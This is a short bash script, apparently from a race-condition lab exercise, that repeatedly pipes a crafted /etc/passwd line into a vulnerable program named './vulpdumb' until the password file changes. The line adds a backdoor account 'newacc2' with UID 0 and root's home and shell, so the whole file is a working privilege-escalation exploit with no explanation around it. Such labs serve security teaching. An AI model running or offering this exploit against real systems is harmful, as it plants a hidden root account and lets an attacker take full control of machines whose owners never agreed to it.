#!/bin/bash

CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ]  
do
   echo "newacc2:U6aMy0wojraho:0:0:newacc2:/root:/bin/bash" | ./vulpdumb
   new=$($CHECK_FILE)
done
echo "TERMINATE: The /etc/passwd file has been modified"
